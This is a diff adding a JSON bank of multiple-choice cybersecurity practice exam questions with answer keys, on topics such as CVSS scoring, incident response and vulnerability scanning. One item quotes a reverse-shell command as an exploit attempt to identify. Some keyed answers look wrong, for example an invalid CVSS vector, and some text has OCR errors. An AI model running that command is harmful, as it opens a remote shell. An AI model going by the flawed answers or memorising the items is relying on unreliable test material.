@@ -1,0 +1,2638 @@
+[
+    {
+        "question": {
+            "text": "A recent zero-day vulnerability is being actively exploited, requires no user interaction or privilege escalation, and has a significant impact to confidentiality and integrity but not to availability. Which of the following CVE metrics would be most accurate for this zero-day threat?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "CVSS:31/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:K/A:L"
+            },
+            {
+                "id": "B",
+                "text": "CVSS:31/AV:K/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:L"
+            },
+            {
+                "id": "C",
+                "text": "CVSS:31/AV:N/AC:L/PR:N/UI:H/S:U/C:L/I:N/A:H"
+            },
+            {
+                "id": "D",
+                "text": "CVSS:31/AV:L/AC:L/PR:R/UI:R/S:U/C:H/I:L/A:H"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "Which of the following tools would work best to prevent the exposure of PII outside of an organization?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "PAM"
+            },
+            {
+                "id": "B",
+                "text": "IDS"
+            },
+            {
+                "id": "C",
+                "text": "PKI"
+            },
+            {
+                "id": "D",
+                "text": "DLP"
+            }
+        ],
+        "answer": "D"
+    },
+    {
+        "question": {
+            "text": "An organization conducted a web application vulnerability assessment against the corporate website, and the following output was observed:",
+            "image": "images/question3.png",
+            "footer": "Which of the following tuning recommendations should the security analyst share?"
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Set an HttpOnly flag to force communication by HTTPS"
+            },
+            {
+                "id": "B",
+                "text": "Block requests without an X-Frame-Options header"
+            },
+            {
+                "id": "C",
+                "text": "Configure an Access-Control-Allow-Origin header to authorized domains"
+            },
+            {
+                "id": "D",
+                "text": "Disable the cross-origin resource sharing header"
+            }
+        ],
+        "answer": "C"
+    },
+    {
+        "question": {
+            "text": "Which of the following items should be included in a vulnerability scan report? (Choose two.)",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Lessons learned"
+            },
+            {
+                "id": "B",
+                "text": "Service-level agreement"
+            },
+            {
+                "id": "C",
+                "text": "Playbook"
+            },
+            {
+                "id": "D",
+                "text": "Affected hosts"
+            },
+            {
+                "id": "E",
+                "text": "Risk score"
+            },
+            {
+                "id": "F",
+                "text": "Education plan"
+            }
+        ],
+        "answer": "D,E"
+    },
+    {
+        "question": {
+            "text": "The Chief Executive Officer of an organization recently heard that exploitation of new attacks in the industry was happening approximately 45 days after a patch was released. Which of the following would best protect this organization?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "A mean time to remediate of 30 days"
+            },
+            {
+                "id": "B",
+                "text": "A mean time to detect of 45 days"
+            },
+            {
+                "id": "C",
+                "text": "A mean time to respond of 15 days"
+            },
+            {
+                "id": "D",
+                "text": "Third-party application testing"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "A security analyst recently joined the team and is trying to determine which scripting language is being used in a production script to determine if it is malicious. Given the following script:",
+            "image": "images/question6.png",
+            "footer": "Which of the following scripting languages was used in the script?"
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "PowerShell"
+            },
+            {
+                "id": "B",
+                "text": "Ruby"
+            },
+            {
+                "id": "C",
+                "text": "Python"
+            },
+            {
+                "id": "D",
+                "text": "Shell script"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "A company's user accounts have been compromised. Users are also reporting that the company's internal portal is sometimes only accessible through HTTP, other times; it is accessible through HTTPS. Which of the following most likely describes the observed activity?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "There is an issue with the SSL certificate causing port 443 to become unavailable for HTTPS access"
+            },
+            {
+                "id": "B",
+                "text": "An on-path attack is being performed by someone with internal access that forces users into port 80"
+            },
+            {
+                "id": "C",
+                "text": "The web server cannot handle an increasing amount of HTTPS requests so it forwards users to port 80"
+            },
+            {
+                "id": "D",
+                "text": "An error was caused by BGP due to new rules applied over the company's internal routers"
+            }
+        ],
+        "answer": "B"
+    },
+    {
+        "question": {
+            "text": "A security analyst is tasked with prioritizing vulnerabilities for remediation. The relevant company security policies are shown below:\n    Security Policy 1006: Vulnerability Management\n    • The Company shall use the CVSSv3.1 Base Score Metrics (Exploitability and Impact) to prioritize the remediation of security vulnerabilities.\n    • In situations where a choice must be made between confidentiality and availability, the Company shall prioritize confidentiality of data over availability of systems and data.\n    • The Company shall prioritize patching of publicly available systems and services over patching of internally available system.\n    According to the security policy, which of the following vulnerabilities should be the highest priority to patch?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Name: THOR.HAMMER - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H Internal System"
+            },
+            {
+                "id": "B",
+                "text": "Name: CAP.SHIELD - CVSS 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N External System"
+            },
+            {
+                "id": "C",
+                "text": "Name: LOKI.DAGGER - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H External System"
+            },
+            {
+                "id": "D",
+                "text": "Name: THANOS.GAUNTLET - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N Internal System"
+            }
+        ],
+        "answer": "B"
+    },
+    {
+        "question": {
+            "text": "Which of the following will most likely ensure that mission-critical services are available in the event of an incident?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Business continuity plan"
+            },
+            {
+                "id": "B",
+                "text": "Vulnerability management plan"
+            },
+            {
+                "id": "C",
+                "text": "Disaster recovery plan"
+            },
+            {
+                "id": "D",
+                "text": "Asset management plan"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "The Chief Information Security Officer wants to eliminate and reduce shadow IT in the enterprise. Several high-risk cloud applications are used that increase the risk to the organization. Which of the following solutions will assist in reducing the risk?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Deploy a CASB and enable policy enforcement"
+            },
+            {
+                "id": "B",
+                "text": "Configure MFA with strict access"
+            },
+            {
+                "id": "C",
+                "text": "Deploy an API gateway"
+            },
+            {
+                "id": "D",
+                "text": "Enable SSO to the cloud applications"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "An incident response team receives an alert to start an investigation of an internet outage. The outage is preventing all users in multiple locations from accessing external SaaS resources. The team determines the organization was impacted by a DDoS attack. Which of the following logs should the team review first?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "CDN"
+            },
+            {
+                "id": "B",
+                "text": "Vulnerability scanner"
+            },
+            {
+                "id": "C",
+                "text": "DNS"
+            },
+            {
+                "id": "D",
+                "text": "Web server"
+            }
+        ],
+        "answer": "C"
+    },
+    {
+        "question": {
+            "text": "A malicious actor has gained access to an internal network by means of social engineering. The actor does not want to lose access in order to continue the attack. Which of the following best describes the current stage of the Cyber Kill Chain that the threat actor is currently operating in?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Weaponization"
+            },
+            {
+                "id": "B",
+                "text": "Reconnaissance"
+            },
+            {
+                "id": "C",
+                "text": "Delivery"
+            },
+            {
+                "id": "D",
+                "text": "Exploitation"
+            }
+        ],
+        "answer": "D"
+    },
+    {
+        "question": {
+            "text": "An analyst finds that an IP address outside of the company network that is being used to run network and vulnerability scans across external-facing assets. Which of the following steps of an attack framework is the analyst witnessing?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Exploitation"
+            },
+            {
+                "id": "B",
+                "text": "Reconnaissance"
+            },
+            {
+                "id": "C",
+                "text": "Command and control"
+            },
+            {
+                "id": "D",
+                "text": "Actions on objectives"
+            }
+        ],
+        "answer": "B"
+    },
+    {
+        "question": {
+            "text": "An incident response analyst notices multiple emails traversing the network that target only the administrators of the company. The email contains a concealed URL that leads to an unknown website in another country. Which of the following best describes what is happening? (Choose two.)",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Beaconing"
+            },
+            {
+                "id": "B",
+                "text": "Domain Name System hijacking"
+            },
+            {
+                "id": "C",
+                "text": "Social engineering attack"
+            },
+            {
+                "id": "D",
+                "text": "On-path attack"
+            },
+            {
+                "id": "E",
+                "text": "Obfuscated links"
+            },
+            {
+                "id": "F",
+                "text": "Address Resolution Protocol poisoning"
+            }
+        ],
+        "answer": "C,E"
+    },
+    {
+        "question": {
+            "text": "During security scanning, a security analyst regularly finds the same vulnerabilities in a critical application. Which of the following recommendations would best mitigate this problem if applied along the SDLC phase?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Conduct regular red team exercises over the application in production"
+            },
+            {
+                "id": "B",
+                "text": "Ensure that all implemented coding libraries are regularly checked"
+            },
+            {
+                "id": "C",
+                "text": "Use application security scanning as part of the pipeline for the CI/CD flow"
+            },
+            {
+                "id": "D",
+                "text": "Implement proper input validation for any data entry form"
+            }
+        ],
+        "answer": "C"
+    },
+    {
+        "question": {
+            "text": "An analyst is reviewing a vulnerability report and must make recommendations to the executive team. The analyst finds that most systems can be upgraded with a reboot resulting in a single downtime window. However, two of the critical systems cannot be upgraded due to a vendor appliance that the company does not have access to. Which of the following inhibitors to remediation do these systems and associated vulnerabilities best represent?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Proprietary systems"
+            },
+            {
+                "id": "B",
+                "text": "Legacy systems"
+            },
+            {
+                "id": "C",
+                "text": "Unsupported operating systems"
+            },
+            {
+                "id": "D",
+                "text": "Lack of maintenance windows"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "The security team reviews a web server for XSS and runs the following Nmap scan:",
+            "image": "images/question17.png",
+            "footer": "Which of the following most accurately describes the result of the scan?"
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "An output of characters > and \" as the parameters used m the attempt"
+            },
+            {
+                "id": "B",
+                "text": "The vulnerable parameter ID http://172.31.15.2/1.php?id-2 and unfiltered characters returned"
+            },
+            {
+                "id": "C",
+                "text": "The vulnerable parameter and unfiltered or encoded characters passed > and \" as unsafe"
+            },
+            {
+                "id": "D",
+                "text": "The vulnerable parameter and characters > and \" with a reflected XSS attempt"
+            }
+        ],
+        "answer": "D"
+    },
+    {
+        "question": {
+            "text": "Which of the following is the best action to take after the conclusion of a security incident to improve incident response in the future?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Develop a call tree to inform impacted users"
+            },
+            {
+                "id": "B",
+                "text": "Schedule a review with all teams to discuss what occurred"
+            },
+            {
+                "id": "C",
+                "text": "Create an executive summary to update company leadership"
+            },
+            {
+                "id": "D",
+                "text": "Review regulatory compliance with public relations for official notification"
+            }
+        ],
+        "answer": "B"
+    },
+    {
+        "question": {
+            "text": "A security analyst received a malicious binary file to analyze. Which of the following is the best technique to perform the analysis?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Code analysis"
+            },
+            {
+                "id": "B",
+                "text": "Static analysis"
+            },
+            {
+                "id": "C",
+                "text": "Reverse engineering"
+            },
+            {
+                "id": "D",
+                "text": "Fuzzing"
+            }
+        ],
+        "answer": "C"
+    },
+    {
+        "question": {
+            "text": "An incident response team found IoCs in a critical server. The team needs to isolate and collect technical evidence for further investigation. Which of the following pieces of data should be collected first in order to preserve sensitive information before isolating the server?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Hard disk"
+            },
+            {
+                "id": "B",
+                "text": "Primary boot partition"
+            },
+            {
+                "id": "C",
+                "text": "Malicious files"
+            },
+            {
+                "id": "D",
+                "text": "Routing table"
+            },
+            {
+                "id": "E",
+                "text": "Static IP address"
+            }
+        ],
+        "answer": "D"
+    },
+    {
+        "question": {
+            "text": "Which of the following security operations tasks are ideal for automation?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Suspicious file analysis:\n    Look for suspicious-looking graphics in a folder.\n    Create subfolders in the original folder based on category of graphics found.\n    Move the suspicious graphics to the appropriate subfolder"
+            },
+            {
+                "id": "B",
+                "text": "Firewall IoC block actions:\n    Examine the firewall logs for IoCs from the most recently published zero-day exploit\n    Take mitigating actions in the firewall to block the behavior found in the logs\n    Follow up on any false positives that were caused by the block rules"
+            },
+            {
+                "id": "C",
+                "text": "Security application user errors:\n    Search the error logs for signs of users having trouble with the security application\n    Look up the user's phone number -\n    Call the user to help with any questions about using the application"
+            },
+            {
+                "id": "D",
+                "text": "Email header analysis:\n    Check the email header for a phishing confidence metric greater than or equal to five\n    Add the domain of sender to the block list\n    Move the email to quarantine"
+            }
+        ],
+        "answer": "D"
+    },
+    {
+        "question": {
+            "text": "An organization has experienced a breach of customer transactions. Under the terms of PCI DSS, which of the following groups should the organization report the breach to?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "PCI Security Standards Council"
+            },
+            {
+                "id": "B",
+                "text": "Local law enforcement"
+            },
+            {
+                "id": "C",
+                "text": "Federal law enforcement"
+            },
+            {
+                "id": "D",
+                "text": "Card issuer"
+            }
+        ],
+        "answer": "D"
+    },
+    {
+        "question": {
+            "text": "Which of the following is the best metric for an organization to focus on given recent investments in SIEM, SOAR, and a ticketing system?",
+            "imgPath": "",
+            "footer": "Which of the following is the best metric for an organization to focus on given recent investments in SIEM, SOAR, and a ticketing system?"
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Mean time to detect"
+            },
+            {
+                "id": "B",
+                "text": "Number of exploits by tactic"
+            },
+            {
+                "id": "C",
+                "text": "Alert volume"
+            },
+            {
+                "id": "D",
+                "text": "Quantity of intrusion attempts"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "A company is implementing a vulnerability management program and moving from an on-premises environment to a hybrid IaaS cloud environment. Which of the following implications should be considered on the new hybrid environment?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "The current scanners should be migrated to the cloud"
+            },
+            {
+                "id": "B",
+                "text": "Cloud-specific misconfigurations may not be detected by the current scanners Most Voted"
+            },
+            {
+                "id": "C",
+                "text": "Existing vulnerability scanners cannot scan IaaS systems"
+            },
+            {
+                "id": "D",
+                "text": "Vulnerability scans on cloud environments should be performed from the cloud"
+            }
+        ],
+        "answer": "B"
+    },
+    {
+        "question": {
+            "text": "A security alert was triggered when an end user tried to access a website that is not allowed per organizational policy. Since the action is considered a terminable offense, the SOC analyst collects the authentication logs, web logs, and temporary files, reflecting the web searches from the user's workstation, to build the case for the investigation. Which of the following is the best way to ensure that the investigation complies with HR or privacy policies?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Create a timeline of events detailing the date stamps, user account hostname and IP information associated with the activities"
+            },
+            {
+                "id": "B",
+                "text": "Ensure that the case details do not reflect any user-identifiable information Password protect the evidence and restrict access to personnel related to the investigation"
+            },
+            {
+                "id": "C",
+                "text": "Create a code name for the investigation in the ticketing system so that all personnel with access will not be able to easily identify the case as an HR-related investigation"
+            },
+            {
+                "id": "D",
+                "text": "Notify the SOC manager for awareness after confirmation that the activity was intentional"
+            }
+        ],
+        "answer": "B"
+    },
+    {
+        "question": {
+            "text": "Which of the following is the first step that should be performed when establishing a disaster recovery plan?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Agree on the goals and objectives of the plan"
+            },
+            {
+                "id": "B",
+                "text": "Determine the site to be used during a disaster"
+            },
+            {
+                "id": "C",
+                "text": "Demonstrate adherence to a standard disaster recovery process"
+            },
+            {
+                "id": "D",
+                "text": "Identify applications to be run during a disaster"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "A technician identifies a vulnerability on a server and applies a software patch. Which of the following should be the next step in the remediation process?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Testing"
+            },
+            {
+                "id": "B",
+                "text": "Implementation"
+            },
+            {
+                "id": "C",
+                "text": "Validation"
+            },
+            {
+                "id": "D",
+                "text": "Rollback"
+            }
+        ],
+        "answer": "C"
+    },
+    {
+        "question": {
+            "text": "The analyst reviews the following endpoint log entry:",
+            "image": "images/question28.png",
+            "footer": "Which of the following has occurred?"
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Registry change"
+            },
+            {
+                "id": "B",
+                "text": "Rename computer"
+            },
+            {
+                "id": "C",
+                "text": "New account introduced"
+            },
+            {
+                "id": "D",
+                "text": "Privilege escalation"
+            }
+        ],
+        "answer": "C"
+    },
+    {
+        "question": {
+            "text": "A security program was able to achieve a 30% improvement in MTTR by integrating security controls into a SIEM. The analyst no longer had to jump between tools. Which of the following best describes what the security program did?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Data enrichment"
+            },
+            {
+                "id": "B",
+                "text": "Security control plane"
+            },
+            {
+                "id": "C",
+                "text": "Threat feed combination"
+            },
+            {
+                "id": "D",
+                "text": "Single pane of glass"
+            }
+        ],
+        "answer": "D"
+    },
+    {
+        "question": {
+            "text": "Due to reports of unauthorized activity that was occurring on the internal network, an analyst is performing a network discovery. The analyst runs an Nmap scan against a corporate network to evaluate which devices were operating in the environment. Given the following output:",
+            "image": "images/question30.png",
+            "footer": "Which of the following choices should the analyst look at first?"
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "wh4dc-748gy.lan (192.168.86.152)"
+            },
+            {
+                "id": "B",
+                "text": "officerckuplayer.lan (192.168.86.22)"
+            },
+            {
+                "id": "C",
+                "text": "imaging.lan (192.168.86.150)"
+            },
+            {
+                "id": "D",
+                "text": "xlaptop.lan (192.168.86.249)"
+            },
+            {
+                "id": "E",
+                "text": "p4wnp1_aloa.lan (192.168.86.56)"
+            }
+        ],
+        "answer": "E"
+    },
+    {
+        "question": {
+            "text": "When starting an investigation, which of the following must be done first?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Notify law enforcement"
+            },
+            {
+                "id": "B",
+                "text": "Secure the scene"
+            },
+            {
+                "id": "C",
+                "text": "Seize all related evidence"
+            },
+            {
+                "id": "D",
+                "text": "Interview the witnesses"
+            }
+        ],
+        "answer": "B"
+    },
+    {
+        "question": {
+            "text": "Which of the following describes how a CSIRT lead determines who should be communicated with and when during a security incident?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "The lead should review what is documented in the incident response policy or plan"
+            },
+            {
+                "id": "B",
+                "text": "Management level members of the CSIRT should make that decision"
+            },
+            {
+                "id": "C",
+                "text": "The lead has the authority to decide who to communicate with at any t me"
+            },
+            {
+                "id": "D",
+                "text": "Subject matter experts on the team should communicate with others within the specified area of expertise"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "A new cybersecurity analyst is tasked with creating an executive briefing on possible threats to the organization. Which of the following will produce the data needed for the briefing?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Firewall logs"
+            },
+            {
+                "id": "B",
+                "text": "Indicators of compromise"
+            },
+            {
+                "id": "C",
+                "text": "Risk assessment"
+            },
+            {
+                "id": "D",
+                "text": "Access control lists"
+            }
+        ],
+        "answer": "C"
+    },
+    {
+        "question": {
+            "text": "An analyst notices there is an internal device sending HTTPS traffic with additional characters in the header to a known-malicious IP in another country. Which of the following describes what the analyst has noticed?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Beaconing"
+            },
+            {
+                "id": "B",
+                "text": "Cross-site scripting"
+            },
+            {
+                "id": "C",
+                "text": "Buffer overflow"
+            },
+            {
+                "id": "D",
+                "text": "PHP traversal"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "A security analyst is reviewing a packet capture in Wireshark that contains an FTP session from a potentially compromised machine. The analyst sets the following display filter: ftp. The analyst can see there are several RETR requests with 226 Transfer complete responses, but the packet list pane is not showing the packets containing the file transfer itself. Which of the following can the analyst perform to see the entire contents of the downloaded files?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Change the display filter to ftp.active.port"
+            },
+            {
+                "id": "B",
+                "text": "Change the display filter to tcp.port==20"
+            },
+            {
+                "id": "C",
+                "text": "Change the display filter to ftp-data and follow the TCP streams"
+            },
+            {
+                "id": "D",
+                "text": "Navigate to the File menu and select FTP from the Export objects option"
+            }
+        ],
+        "answer": "C"
+    },
+    {
+        "question": {
+            "text": "A SOC manager receives a phone call from an upset customer. The customer received a vulnerability report two hours ago: but the report did not have a follow-up remediation response from an analyst. Which of the following documents should the SOC manager review to ensure the team is meeting the appropriate contractual obligations for the customer?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "SLA"
+            },
+            {
+                "id": "B",
+                "text": "MOU"
+            },
+            {
+                "id": "C",
+                "text": "NDA"
+            },
+            {
+                "id": "D",
+                "text": "Limitation of liability"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "Which of the following phases of the Cyber Kill Chain involves the adversary attempting to establish communication with a successfully exploited target?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Command and control"
+            },
+            {
+                "id": "B",
+                "text": "Actions on objectives"
+            },
+            {
+                "id": "C",
+                "text": "Exploitation"
+            },
+            {
+                "id": "D",
+                "text": "Delivery"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "A company that has a geographically diverse workforce and dynamic IPs wants to implement a vulnerability scanning method with reduced network traffic. Which of the following would best meet this requirement?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "External"
+            },
+            {
+                "id": "B",
+                "text": "Agent-based"
+            },
+            {
+                "id": "C",
+                "text": "Non-credentialed"
+            },
+            {
+                "id": "D",
+                "text": "Credentialed"
+            }
+        ],
+        "answer": "B"
+    },
+    {
+        "question": {
+            "text": "A security analyst detects an exploit attempt containing the following command: sh -i >& /dev/udp/10.1.1.1/4821 0>$l",
+            "imgPath": "",
+            "footer": "Which of the following is being attempted?"
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "RCE"
+            },
+            {
+                "id": "B",
+                "text": "Reverse shell"
+            },
+            {
+                "id": "C",
+                "text": "XSS"
+            },
+            {
+                "id": "D",
+                "text": "SQL injection"
+            }
+        ],
+        "answer": "B"
+    },
+    {
+        "question": {
+            "text": "An older CVE with a vulnerability score of 7.1 was elevated to a score of 9.8 due to a widely available exploit being used to deliver ransomware. Which of the following factors would an analyst most likely communicate as the reason for this escalation?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Scope"
+            },
+            {
+                "id": "B",
+                "text": "Weaponization"
+            },
+            {
+                "id": "C",
+                "text": "CVSS"
+            },
+            {
+                "id": "D",
+                "text": "Asset value"
+            }
+        ],
+        "answer": "B"
+    },
+    {
+        "question": {
+            "text": "An analyst is reviewing a vulnerability report for a server environment with the following entries:",
+            "image": "images/question41.png",
+            "footer": "Which of the following systems should be prioritized for patching first?"
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "10.101.27.98"
+            },
+            {
+                "id": "B",
+                "text": "54.73.225.17"
+            },
+            {
+                "id": "C",
+                "text": "54.74.110.26"
+            },
+            {
+                "id": "D",
+                "text": "54.74.110.228"
+            }
+        ],
+        "answer": "D"
+    },
+    {
+        "question": {
+            "text": "A company is in the process of implementing a vulnerability management program, and there are concerns about granting the security team access to sensitive data. Which of the following scanning methods can be implemented to reduce the access to systems while providing the most accurate vulnerability scan results?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Credentialed network scanning"
+            },
+            {
+                "id": "B",
+                "text": "Passive scanning"
+            },
+            {
+                "id": "C",
+                "text": "Agent-based scanning"
+            },
+            {
+                "id": "D",
+                "text": "Dynamic scanning"
+            }
+        ],
+        "answer": "C"
+    },
+    {
+        "question": {
+            "text": "A security analyst is trying to identify anomalies on the network routing. Which of the following functions can the analyst use on a shell script to achieve the objective most accurately?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "function x() { info=$(geoiplookup $1) && echo \"$1 | $info\" }"
+            },
+            {
+                "id": "B",
+                "text": "function x() { info=$(ping -c 1 $1 | awk -F \"/\" ’END{print $5}’) && echo \"$1 | $info\" }"
+            },
+            {
+                "id": "C",
+                "text": "function x() { info=$(dig $(dig -x $1 | grep PTR | tail -n 1 | awk -F \".in-addr\" ’{print $1} ').origin.asn.cymru.com TXT +short) && echo \"$1 | $info\" }"
+            },
+            {
+                "id": "D",
+                "text": "function x() { info=$(traceroute -m 40 $1 | awk ‘END{print $1}’) && echo \"$1 | $info\" }"
+            }
+        ],
+        "answer": "D"
+    },
+    {
+        "question": {
+            "text": "There are several reports of sensitive information being disclosed via file sharing services. The company would like to improve its security posture against this threat. Which of the following security controls would best support the company in this scenario?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Implement step-up authentication for administrators"
+            },
+            {
+                "id": "B",
+                "text": "Improve employee training and awareness"
+            },
+            {
+                "id": "C",
+                "text": "Increase password complexity standards"
+            },
+            {
+                "id": "D",
+                "text": "Deploy mobile device management"
+            }
+        ],
+        "answer": "B"
+    },
+    {
+        "question": {
+            "text": "Which of the following is the best way to begin preparation for a report titled \"What We Learned\" regarding a recent incident involving a cybersecurity breach?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Determine the sophistication of the audience that the report is meant for"
+            },
+            {
+                "id": "B",
+                "text": "Include references and sources of information on the first page"
+            },
+            {
+                "id": "C",
+                "text": "Include a table of contents outlining the entire report"
+            },
+            {
+                "id": "D",
+                "text": "Decide on the color scheme that will effectively communicate the metrics"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "A security analyst is performing an investigation involving multiple targeted Windows malware binaries. The analyst wants to gather intelligence without disclosing information to the attackers. Which of the following actions would allow the analyst to achieve the objective?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Upload the binary to an air gapped sandbox for analysis"
+            },
+            {
+                "id": "B",
+                "text": "Send the binaries to the antivirus vendor"
+            },
+            {
+                "id": "C",
+                "text": "Execute the binaries on an environment with internet connectivity"
+            },
+            {
+                "id": "D",
+                "text": "Query the file hashes using VirusTotal"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "Which of the following would help to minimize human engagement and aid in process improvement in security operations?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "OSSTMM"
+            },
+            {
+                "id": "B",
+                "text": "SIEM"
+            },
+            {
+                "id": "C",
+                "text": "SOAR"
+            },
+            {
+                "id": "D",
+                "text": "OWASP"
+            }
+        ],
+        "answer": "C"
+    },
+    {
+        "question": {
+            "text": "After conducting a cybersecurity risk assessment for a new software request, a Chief Information Security Officer (CISO) decided the risk score would be too high. The CISO refused the software request. Which of the following risk management principles did the CISO select?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Avoid"
+            },
+            {
+                "id": "B",
+                "text": "Transfer"
+            },
+            {
+                "id": "C",
+                "text": "Accept"
+            },
+            {
+                "id": "D",
+                "text": "Mitigate"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "Which of the following is an important aspect that should be included in the lessons-learned step after an incident?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Identify any improvements or changes in the incident response plan or procedures"
+            },
+            {
+                "id": "B",
+                "text": "Determine if an internal mistake was made and who did it so they do not repeat the error"
+            },
+            {
+                "id": "C",
+                "text": "Present all legal evidence collected and turn it over to iaw enforcement"
+            },
+            {
+                "id": "D",
+                "text": "Discuss the financial impact of the incident to determine if security controls are well spent"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "The security operations team is required to consolidate several threat intelligence feeds due to redundant tools and portals. Which of the following will best achieve the goal and maximize results?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "Single pane of glass"
+            },
+            {
+                "id": "B",
+                "text": "Single sign-on"
+            },
+            {
+                "id": "C",
+                "text": "Data enrichment"
+            },
+            {
+                "id": "D",
+                "text": "Deduplication"
+            }
+        ],
+        "answer": "A"
+    },
+    {
+        "question": {
+            "text": "Which of the following would a security analyst most likely use to compare TTPs between different known adversaries of an organization?",
+            "imgPath": "",
+            "footer": ""
+        },
+        "choices": [
+            {
+                "id": "A",
+                "text": "MITRE ATT&CK"
+            },
+            {
+                "id": "B",
+                "text": "Cyber Kill Cham"
+            },
+            {
+                "id": "C",
+                "text": "OWASP"
+            },
+            {
